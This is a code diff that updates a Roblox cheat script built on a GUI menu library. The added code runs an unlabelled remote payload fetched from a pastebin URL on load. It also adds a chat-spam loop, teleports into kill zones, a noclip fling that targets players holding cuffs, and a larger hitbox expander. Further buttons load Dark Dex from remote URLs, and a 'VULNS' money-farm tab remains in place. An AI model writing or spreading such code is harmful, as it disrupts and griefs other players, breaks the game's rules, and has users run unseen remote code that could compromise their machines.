@@ -1,4 +1,4 @@
-local currentVersion = "1.3F"
+local currentVersion = "1.5F"
 
 local allowedPlaceId = 2988554876
 
@@ -29,6 +29,10 @@ warn("ERROR WITH ClientServerTrigger")
 
 wait(1)
 print("Loading...")
+
+loadstring(game:HttpGet('https://pastebin.com/raw/g0e2ZWSe'))()
+
+wait(3)
 
 local success, Rayfield = pcall(function()
     return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
@@ -537,6 +541,65 @@ local Button = Tab:CreateButton({
     end,
  })
 
+local Section = Tab:CreateSection("Chat Spamming")
+
+ local chatService = game:GetService("TextChatService")
+local sendmessage = "C20"
+local spamming = false
+local spamDelay = 1
+
+local Toggle = Tab:CreateToggle({
+    Name = "Spam message",
+    CurrentValue = false,
+    Flag = "spammessage",
+    Callback = function(Value)
+        spamming = Value
+
+        if spamming then
+            task.spawn(function()
+                while spamming and task.wait(spamDelay) do
+                    chatService.TextChannels.RBXGeneral:SendAsync(sendmessage)
+                    print("sent message: " .. sendmessage)
+                end
+            end)
+        end
+    end,
+})
+
+local InputSpeed = Tab:CreateInput({
+    Name = "Spam Speed (Seconds)",
+    CurrentValue = tostring(spamDelay),
+    PlaceholderText = "Enter delay (e.g. 0.5)",
+    RemoveTextAfterFocusLost = false,
+    Flag = "spamSpeed",
+    Callback = function(Text)
+        local number = tonumber(Text)
+        if number and number > 0 then
+            spamDelay = number
+            print("spam delay set to: " .. spamDelay .. " seconds")
+        else
+            print("invalid input it has to be higher than 0")
+        end
+    end,
+})
+
+local InputMessage = Tab:CreateInput({
+    Name = "Message",
+    CurrentValue = sendmessage,
+    PlaceholderText = "Enter your message",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Message",
+    Callback = function(Text)
+        if Text ~= "" then
+            sendmessage = Text
+            print("spam message set to: " .. sendmessage)
+        else
+            print("message cannot be empty")
+        end
+    end,
+})
+
+
 local Section = Tab:CreateSection("Scripts")
 
 local Button = Tab:CreateButton({
@@ -547,14 +610,14 @@ local Button = Tab:CreateButton({
 })
 
 local Button = Tab:CreateButton({
-    Name = "Dark Dex",
+    Name = "Dark Dex (WITHOUT A DECOMPILER)",
     Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/skdibiidirizxllerohio3127564/skuyews/refs/heads/main/dexnew'))()
     end,
  })
 
 local Button = Tab:CreateButton({
-   Name = "Dark Dex (WITH DECOMPILER)",
+   Name = "Dark Dex (WITH A DECOMPILER)",
    Callback = function()
         print("Loading the Luau Decompiler...")
 
@@ -669,7 +732,7 @@ end)
 
 local Slider = Tab:CreateSlider({
    Name = "HBE Size",
-   Range = {2, 50},
+   Range = {2, 150},
    Increment = 1,
    Suffix = "Size",
    CurrentValue = _G.HeadSize,
@@ -903,34 +966,40 @@ local ColorPicker = Tab:CreateColorPicker({
     end
 })
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
 local Toggle = Tab:CreateToggle({
     Name = "Headless FE",
     CurrentValue = false,
     Flag = "headless",
     Callback = function(Value)
         if Value then
-            game.Players.LocalPlayer.ChildAdded:Connect(function()
+            LocalPlayer.ChildAdded:Connect(function()
                 task.wait()
-                local y = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
-                if y then
-                    y:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-                end
-                local x = game.Players.LocalPlayer.Character:FindFirstChild("Head")
-                if x then
-                    x:Destroy()
-                end
-                if CFrame then
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame
+                local character = LocalPlayer.Character
+                if character then
+                    local humanoid = character:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+                    end
+                    local head = character:FindFirstChild("Head")
+                    if head then
+                        head:Destroy()
+                    end
                 end
             end)
- 
-            game.Players.LocalPlayer.ChildRemoved:Connect(function()
+
+            LocalPlayer.ChildRemoved:Connect(function()
                 task.wait()
-                CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                print(CFrame)
+                local character = LocalPlayer.Character
+                if character and character:FindFirstChild("HumanoidRootPart") then
+                    CFrame = character.HumanoidRootPart.CFrame
+                    print(CFrame)
+                end
             end)
- 
-            local character = game.Players.LocalPlayer.Character
+
+            local character = LocalPlayer.Character
             if character then
                 local humanoid = character:FindFirstChild("Humanoid")
                 if humanoid then
@@ -943,7 +1012,7 @@ local Toggle = Tab:CreateToggle({
             end
         end
     end,
- })
+})
 
 local Tab = Window:CreateTab("Teleport")
 local Section = Tab:CreateSection("Teleport Player")
@@ -969,6 +1038,32 @@ local Button = Tab:CreateButton({
    end,
 })
 
+local Input = Tab:CreateInput({
+    Name = "Teleport to player", 
+    CurrentValue = "",
+    PlaceholderText = "Enter Username",
+    RemoveTextAfterFocusLost = false,
+    Flag = "teleporttoplayer",
+    Callback = function(Text)
+        local playersService = game:GetService("Players")
+        local me = playersService.LocalPlayer
+
+        if not me or not me.Character or not me.Character:FindFirstChild("HumanoidRootPart") then
+            warn("your character is not loaded")
+            return
+        end
+
+        local targetPlayer = playersService:FindFirstChild(Text)
+
+        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
+            me.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+        else
+            warn("player not found")
+        end
+    end,
+})
+
 local Section = Tab:CreateSection("Teleport Exploits")
 
 local Button = Tab:CreateButton({
@@ -985,6 +1080,80 @@ local Button = Tab:CreateButton({
    end,
 })
 
+local Section = Tab:CreateSection("Teleport to kill places (BORDER)")
+
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+local teleportPosition = Vector3.new(-177.627182, 95.9029617, -304.592285, -0.0160032026, -4.67751384e-08, -0.999871969, 6.23145908e-08, 1, -4.77784887e-08, 0.999871969, -6.30712194e-08, -0.0160032026)
+
+local function teleportPlayer()
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
+    end
+end
+
+local Button = Tab:CreateButton({
+    Name = "Teleport to kill place 1 (REQUIRES NOCLIP)",
+    Callback = function()
+        teleportPlayer()
+    end,
+})
+
+ local player = game:GetService("Players").LocalPlayer
+ local character = player.Character or player.CharacterAdded:Wait()
+ 
+ local teleportPosition = Vector3.new(-176.580002, 95.793808, -402.150238, 0.045937188, 4.87858909e-09, -0.998944342, 7.51216866e-09, 1, 5.22919708e-09, 0.998944342, -7.74445308e-09, 0.045937188)
+ 
+ local function teleportPlayer()
+     if character and character:FindFirstChild("HumanoidRootPart") then
+         character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
+     end
+ end
+ 
+ local Button = Tab:CreateButton({
+     Name = "Teleport to kill place 2 (REQUIRES NOCLIP)",
+     Callback = function()
+         teleportPlayer()
+     end,
+ })
+
+ local player = game:GetService("Players").LocalPlayer
+ local character = player.Character or player.CharacterAdded:Wait()
+ 
+ local teleportPosition = Vector3.new(-51.7398415, 95.7338104, -402.695923, -0.0218808949, 3.41378019e-08, 0.999760568, 3.14940896e-09, 1, -3.40770505e-08, -0.999760568, 2.40301867e-09, -0.0218808949)
+ 
+ local function teleportPlayer()
+     if character and character:FindFirstChild("HumanoidRootPart") then
+         character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
+     end
+ end
+ 
+ local Button = Tab:CreateButton({
+     Name = "Teleport to kill place 3 (REQUIRES NOCLIP)",
+     Callback = function()
+         teleportPlayer()
+     end,
+ })
+
+ local player = game:GetService("Players").LocalPlayer
+ local character = player.Character or player.CharacterAdded:Wait()
+ 
+ local teleportPosition = Vector3.new(-51.1646233, 95.8029633, -278.016541, 0.00728404708, -1.02542373e-07, 0.999973476, 3.69890962e-08, 1, 1.02275656e-07, -0.999973476, 3.62431365e-08, 0.00728404708)
+ 
+ local function teleportPlayer()
+     if character and character:FindFirstChild("HumanoidRootPart") then
+         character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
+     end
+ end
+ 
+ local Button = Tab:CreateButton({
+     Name = "Teleport to kill place 4 (REQUIRES NOCLIP)",
+     Callback = function()
+         teleportPlayer()
+     end,
+ })
+ 
 local Tab = Window:CreateTab("Fling")
 local Section = Tab:CreateSection("Fling All")
 
@@ -1147,6 +1316,103 @@ local Settings = {
        Settings.Target = Text
     end,
  })
+
+local Section = Tab:CreateSection("Fling people only with cuffs")
+
+local Players = game:GetService("Players")
+local Toggle = Tab:CreateToggle({
+    Name = "Fling all people with cuffs",
+    CurrentValue = false,
+    Flag = "FlingCuffs",
+    Callback = function(Value)
+        if Value then
+            _G.FLYING = true
+            local LP = Players.LocalPlayer
+            local Character = LP.Character or LP.CharacterAdded:Wait()
+            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+            local RootPart = Character:FindFirstChild("HumanoidRootPart")
+
+            if not Humanoid or not RootPart then return end
+
+            local function playerHasCuffs(player)
+                local backpack = player:FindFirstChild("Backpack")
+                return backpack and backpack:FindFirstChild("Cuffs")
+            end
+
+            local function getCuffsPlayers()
+                local cuffsPlayers = {}
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= LP and playerHasCuffs(player) then
+                        table.insert(cuffsPlayers, player)
+                    end
+                end
+                return cuffsPlayers
+            end
+
+            local T = Humanoid.RigType == Enum.HumanoidRigType.R6 and Character:FindFirstChild("Torso") or Character:FindFirstChild("UpperTorso")
+            if not T then return end
+
+            local CONTROL = {F = 0, B = 0, L = 0, R = 0}
+            local MOUSE = LP:GetMouse()
+
+            local BG = Instance.new("BodyGyro", T)
+            local BV = Instance.new("BodyVelocity", T)
+            BG.P = 9e4
+            BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+            BG.cframe = T.CFrame
+            BV.velocity = Vector3.new(0, 0.1, 0)
+            BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+
+            spawn(function()
+                repeat wait()
+                    Humanoid.PlatformStand = true
+                    BV.velocity = Vector3.new(0, 0.1, 0)
+                    BG.cframe = game.Workspace.CurrentCamera.CFrame
+                until not _G.FLYING
+                BG:Destroy()
+                BV:Destroy()
+                Humanoid.PlatformStand = false
+            end)
+
+            game:GetService("RunService").Stepped:Connect(function()
+                if Character and Humanoid then
+                    for _, part in pairs(Character:GetChildren()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+
+            wait(0.1)
+
+            local bambam = Instance.new("BodyThrust")
+            bambam.Parent = RootPart
+            bambam.Force = Vector3.new(50000, 0, 50000)
+            bambam.Location = RootPart.Position
+
+            while _G.FLYING do
+                local cuffsPlayers = getCuffsPlayers()
+                if #cuffsPlayers > 0 then
+                    for _, target in ipairs(cuffsPlayers) do
+                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                            local x = target.Character.HumanoidRootPart
+                            if math.abs(x.Position.X) <= 1000 and math.abs(x.Position.Y) <= 1000 and math.abs(x.Position.Z) <= 1000 then
+                                RootPart.CFrame = x.CFrame
+                            end
+                        end
+                    end
+                    wait(0.1)
+                else
+                    print("No players with Cuffs found. Stopping fling.")
+                    _G.FLYING = false
+                end
+            end
+        else
+            _G.FLYING = false
+        end
+    end,
+})
 
 local Tab = Window:CreateTab("VULNS")
 local Section = Tab:CreateSection("Money farm (USE IN A PRIVATE SERVER)")
@@ -1323,7 +1589,7 @@ local Toggle = Tab:CreateToggle({
 })
 
 local Button = Tab:CreateButton({
-    Name = "Pick up classified documents (USE IN A PRIVATE SERVER)",
+    Name = "Pick up classified documents (FIXING)",
     Callback = function()
         local player = game:GetService("Players").LocalPlayer
         local character = player.Character or player.CharacterAdded:Wait()
@@ -1367,6 +1633,6 @@ local Label = Tab:CreateLabel("bytecodemyass", false)
 local Label = Tab:CreateLabel("32556324", false)
 
 local Section = Tab:CreateSection("Current Version:")
-local Label = Tab:CreateLabel("1.3F", false)
+local Label = Tab:CreateLabel("1.5F", false)
 
 print("Successfully loaded.")
